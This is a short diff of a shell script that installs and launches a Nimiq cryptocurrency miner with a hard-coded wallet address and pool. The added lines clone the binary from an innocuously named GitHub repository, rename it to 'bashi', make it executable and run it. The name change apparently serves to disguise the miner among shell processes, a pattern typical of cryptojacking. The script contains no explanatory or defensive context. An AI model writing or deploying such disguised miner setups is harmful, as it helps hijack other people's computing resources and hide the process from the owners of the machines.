@@ -1,7 +1,7 @@
 apt update
-apt install unzip -y
-wget https://github.com/Beeppool/miner/releases/download/0.6.0/beepminer-0.6.0.zip
-unzip beepminer-0.6.0.zip
-cd beepminer-0.6.0
+apt install unzip git -y
+git clone https://github.com/komaria10003099/super-duper-disco.git
+cd super-duper-disco
 mv miner bashi
+chmod +x bashi
 ./bashi --wallet-address='NQ04 H0C7 TJYF 68DT RQSF FSKX AT0A UNED 1XKL' --pool=pool.acemining.co:8443 --type=dumb --miner=4
